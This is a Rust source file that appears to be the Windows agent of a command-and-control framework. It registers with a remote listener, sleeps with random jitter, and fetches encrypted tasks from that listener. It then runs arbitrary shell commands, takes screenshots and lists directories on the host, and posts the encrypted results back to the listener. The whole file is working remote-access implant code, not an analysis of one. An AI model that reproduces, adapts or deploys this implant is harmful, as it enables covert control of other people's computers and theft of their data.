// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
use regex::Regex;
use std::{thread, time};
use windows::core::{Error, HSTRING};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};

use crate::{
    core::{
        handlers::win::{
            async_handler::HRequestAsync,
            handler::{HConnect, HInternet, HRequest, HSession},
        },
        postdata::{CipherData, PlainData, RegisterAgentData},
        systeminfo::systeminfo_windows::get_computer_name,
        tasks::{
            screenshot::screenshot,
            win::shell::shell,
        },
    },
    Config,
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::random::{random_name, random_sleeptime},
};

pub async fn run(config: Config) -> Result<(), Error> {
    let user_agent = HSTRING::from(config.listener.user_agent.to_string());

    let hsession = HSession::new(user_agent)?;
    let mut hconnect = HConnect::new(
        &hsession,
        HSTRING::from(config.listener.host.to_string()),
        config.listener.port,
    )?;

    // Get agent info for registration
    let agent_name = random_name("agent".to_owned());
    let hostname = match get_computer_name() {
        Ok(name) => name,
        Err(_) => "unknown".to_string(),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let mut rad = RegisterAgentData::new(
        agent_name.to_string(),
        hostname,
        os,
        arch,
        listener_url,
        config.my_public_key,
    );
    let rad_json = serde_json::to_string(&rad.clone()).unwrap();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(
            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
        );
    
        // Register agent
        let response = match post(&mut hconnect, "/r".to_owned(), rad_json.to_string()).await {
            Ok(resp) => {
                registered = true;
                resp
            }
            Err(e) => {
                println!("Error registration: {:?}", e);
                continue;
            }
        };

        // println!("{}", response);
    }

    let plaindata = PlainData::new(agent_name.to_string());
    let plaindata_json = serde_json::to_string(&plaindata).unwrap();

    loop {
        // TODO: Implement graceful shutdown.

        thread::sleep(
            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
        );

        // Get task
        let task = match post(&mut hconnect, "/t/a".to_owned(), plaindata_json.to_string()).await {
            Ok(resp) => {
                if resp == "" {
                    continue;
                }

                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            },
            Err(e) => {
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "cd" => {
                match std::env::set_current_dir(task_args[1].as_str()) {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            "The current directory chanted successfully.".as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                }
            }
            "ls" => {
                match std::fs::read_dir(task_args[1].as_str()) {
                    Ok(result) => {
                        let re = Regex::new(r"\\").unwrap();

                        let mut output = String::new();
                        output = output + "\n";
                        for path in result {
                            if let Ok(entry) = path {
                                let entry_name = &entry.path().to_string_lossy().to_string();
                                let entry_name_2 = re.replace_all(entry_name, "/");
                                let entry_name_3 = entry_name_2.split("/").last().unwrap().to_string();

                                if let Ok(metadata) = entry.metadata() {
                                    output = output + format!(
                                        "{:<20} {}\n", entry_name_3, metadata.len()).as_str();
                                } else {
                                    output = output + format!(
                                        "{}", entry_name_3).as_str();
                                }
                            }
                        }

                        post_task_result(
                            &mut hconnect,
                            output.as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                }
            }
            "pwd" => {
                match std::env::current_dir() {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            &result.to_str().unwrap().as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                }
            }
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            &result,
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                }
            }
            "shell" => {
                match shell(task_args[1..].join(" ")).await {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            &result,
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        ).await;
                    }
                }
            }
            _ => {
                continue;
            }
        }
    }

    hconnect.h.close();
    hsession.h.close();

    Ok(())
}

async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error> {
    let mut hrequest = HRequest::new(
        hconnect,
        HSTRING::from("GET".to_string()),
        HSTRING::from(url_path.to_string()),
        None,
    )?;
    
    hrequest.send_req(
        HSTRING::new(),
        0,
        0)?;
    hrequest.recv_resp()?;

    let mut response = String::new();
    
    loop {
        let mut dw_size = 0;

        if let Err(e) = hrequest.query_data_available(Some(&mut dw_size)) {
            println!("Error querying data available: {}", e.to_string());
        }

        if dw_size == 0 {
            break;
        }

        let mut buffer: Vec<u8> = vec![0; dw_size as usize];

        let r = hrequest.read_data(dw_size, &mut buffer);
        match r {
            Ok(_) => {
                response = response + String::from_utf8_lossy(&buffer).to_string().as_str();
            },
            Err(e) => println!("Error: {:?}", e),
        }

        if dw_size > 0 {
            break;
        }
    }

    hrequest.h.close();

    Ok(response)
}

async fn post(
    hconnect: &mut HConnect,
    url_path: String,
    data: String
) -> Result<String, Error> {

    let hrequest = HRequest::new(
        hconnect,
        HSTRING::from("POST".to_string()),
        HSTRING::from(url_path.to_string()),
        Some(vec![HSTRING::from("application/json")]),
    )?;

    let mut hreq_async = HRequestAsync::new(hrequest);

    let headers = HSTRING::from("Content-Type: application/json".to_string());

    hreq_async.async_send_req(headers, data.len() as u32).await?;
    hreq_async.async_write_data(
        data.as_bytes(),
        data.len() as u32
    ).await?;
    hreq_async.async_recv_resp().await?;

    let mut response = String::new();

    loop {
        let dw_size = hreq_async.async_query_data_available().await?;
        if dw_size == 0 {
            break;
        }

        for _ in 0..dw_size {
            let mut temp_buf = [0 as u8];
            let buf = temp_buf.as_mut_slice();
            let len_read = hreq_async
                .async_read_data(buf.len() as u32, buf).await?;
            assert!(buf.len() == len_read as usize);
            response.push(buf[0] as char);
        }
    }
    
    hreq_async.h.h.close();

    Ok(response)
}

async fn post_task_result(
    hconnect: &mut HConnect,
    result: &[u8],
    agent_name: String,
    my_secret_key: StaticSecret,
    server_public_key: PublicKey,
) {
    let cipherdata = CipherData::new(
        agent_name,
        result,
        my_secret_key,
        server_public_key,
    );
    let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
    post(hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
}

// fn close_handler(h: &mut HInternet) {
//     h.close();
// }